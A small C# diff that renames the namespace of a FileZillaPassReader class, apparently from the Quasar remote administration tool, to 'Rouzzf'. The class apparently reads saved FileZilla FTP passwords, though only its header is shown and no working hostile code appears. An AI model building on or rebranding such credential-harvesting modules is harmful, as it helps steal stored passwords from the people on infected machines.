@@ -1,11 +1,11 @@
-﻿using Quasar.Common.Models;
+﻿using Rouzzf.Common.Models;
 using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Text;
 using System.Xml;
 
-namespace Quasar.Client.Recovery.FtpClients
+namespace Rouzzf.Client.Recovery.FtpClients
 {
     public class FileZillaPassReader : IAccountReader
     {
